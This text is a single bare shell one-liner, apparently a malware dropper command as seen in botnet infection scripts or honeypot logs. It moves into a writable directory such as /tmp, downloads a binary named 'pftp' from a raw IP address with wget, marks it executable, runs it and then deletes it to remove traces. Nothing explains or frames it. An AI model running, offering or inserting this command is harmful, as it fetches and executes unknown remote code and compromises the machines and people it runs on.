cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.182.21.231/pftp; chmod +x pftp; ./pftp; rm -rf pftp
